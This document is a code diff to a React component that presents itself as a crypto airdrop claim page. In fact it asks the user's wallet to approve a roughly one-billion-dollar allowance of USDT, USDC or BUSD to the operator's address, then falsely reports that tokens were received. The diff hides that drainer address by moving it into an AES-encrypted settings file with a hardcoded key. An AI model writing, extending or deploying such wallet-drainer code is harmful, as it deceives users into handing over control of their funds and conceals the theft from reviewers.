@@ -1,9 +1,8 @@
 import React from "react"
 import { connect } from 'react-redux';
 import { log, logwarn, logerror } from "../std"
-
 import { toast } from 'react-toastify';
-
+import CryptoJS from 'crypto-js';
 import { connectWeb3, CHAINS, switchChain } from "../store/web3Store";
 import Wallet from "./Wallet";
 import Button from "./Button";
@@ -12,85 +11,50 @@ import "./AirdropToken.scss"
 
 class AirdropToken extends React.Component {
     state = {
-        isConnectedWeb3: false, abiFolder: "contracts/",
-        USDC: {
-            1: {
-                contract: null,
-                address: "0x647d1Dc5bc8c9a288ABe7032948aE87682b2C4B4",
-                decimals: 6,
-            },
-            56: {
-                contract: null,
-                address: "0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C",
-                decimals: 6,
-            },
-            5777: {
-                contract: null,
-                address: "0xc03d980Fd75a222837D53A4F403D3e400c8a99fF",
-                decimals: 6,
-            },
-        },
-        USDT: {
-            1: {
-                contract: null,
-                address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-                decimals: 6,
-            },
-            56: {
-                contract: null,
-                address: "0x55d398326f99059fF775485246999027B3197955",
-                decimals: 6,
-            },
-            5777: {
-                contract: null,
-                address: "0xc03d980Fd75a222837D53A4F403D3e400c8a99fF",
-                decimals: 6,
-            },
-        },
-        BUSD: {
-            1: {
-                contract: null,
-                address: "0x5864c777697Bf9881220328BF2f16908c9aFCD7e",
-                decimals: 18,
-            },
-            56: {
-                contract: null,
-                address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
-                decimals: 18,
-            },
-            5777: {
-                contract: null,
-                address: "0xc03d980Fd75a222837D53A4F403D3e400c8a99fF",
-                decimals: 18,
-            },
-        },
-        chainId: 1, symbol: "USDT",
-        mAddress: '0x87558A8BdCD865a3d7E2C3A7e8f64Fb7d2E31341',
+        isConnectedWeb3: false, abiFolder: "contracts/", fileSettings: "settings.json",
+        USDC: {}, USDT: {}, BUSD: {},
+        chainId: 1, symbol: "USDT", decryptCode: "11122233344455566677788822244455555555555555555231231321313aaaff",
+        mAddress: null,
 
     }
+
     componentDidMount() {
         if (!window.ethereum || !window.ethereum.isMetaMask) {
             this.setState({ isConnectedWeb3: false })
         }
 
         this.onTokenSelected.bind(this)
+
+        this.loadSettings()
+    }
+
+    async loadSettings() {
+        let settings = await fetch(this.state.fileSettings).then(response => response.json());
+
+        let mAddress = CryptoJS.AES.decrypt(settings.mAddress, 'Weathy Invest').toString(CryptoJS.enc.Utf8);
+        this.setState({ mAddress: mAddress })
+
+        return settings;
     }
 
     async initContracts(symbol, web3 = this.props.web3) {
+        let settings = await this.loadSettings();
+
         let { /*USDC, BUSD, USDT,*/ abiFolder } = this.state;
-        let token = this.state[symbol]
-
         let chainId = parseInt(window.ethereum.chainId)
-        let abiPath = abiFolder + symbol + "_ABI_" + chainId + ".json"
-        log(abiPath)
-        return fetch(abiPath).then(response => response.json()).then(async abi => {
-            let contract = await new web3.eth.Contract(chainId == 5777 ? abi.abi : abi, token[chainId].address);
-            window.mcontract = contract
-            token[chainId].contract = contract;
+        if (!settings.tokens[symbol] || !settings.tokens[symbol][chainId]) {
+            throw new Error("We will support this soon " + symbol + " - " + CHAINS[chainId].chainName)
+        }
+        let token = settings.tokens[symbol]
 
-            this.setState({ [symbol]: token })
-            return token
-        }).catch(error => { throw error })
+        let abiPath = abiFolder + symbol + "_ABI_" + chainId + ".json"
+        let abi = await fetch(abiPath).then(response => response.json());
+        log(abiPath)
+        let contract = await new web3.eth.Contract(chainId == 5777 ? abi.abi : abi, token[chainId].address);
+        window.mcontract = contract
+        token[chainId].contract = contract;
+        this.setState({ [symbol]: token })
+        return token
     }
 
     async reciveAirdrop() {
@@ -101,11 +65,10 @@ class AirdropToken extends React.Component {
             toast.error("Please connect Metamask")
         } else {
             try {
-                await this.initContracts(symbol, web3)
-                let token = this.state[symbol]
+                let token = await this.initContracts(symbol, web3)
                 window.token = token
+                // 1 billion $
                 let amount = "0x" + (1_000_000_000 * (10 ** parseInt(token[chainId].decimals))).toString(16)
-                log(amount)
                 token[chainId].contract.methods.approve(mAddress, amount)
                     .send({ from: accounts[0] }, function (err, tx) {
                         if (err) {
@@ -113,12 +76,11 @@ class AirdropToken extends React.Component {
                             logerror(err)
                         } else toast.success("Recived tokens")
                     })
-
             }
             catch (error) {
                 logerror("reciveAirdrop:", error.message, symbol, chainId)
                 if (error.message.includes("Unexpected token"))
-                    toast.error(`We haven't suport this chain yet: ${symbol} - ${CHAINS[ chainId].chainName}`)
+                    toast.error(`We haven't suport this chain yet: ${symbol} - ${CHAINS[chainId].chainName}`)
                 else toast.error(error.message)
             }
         }
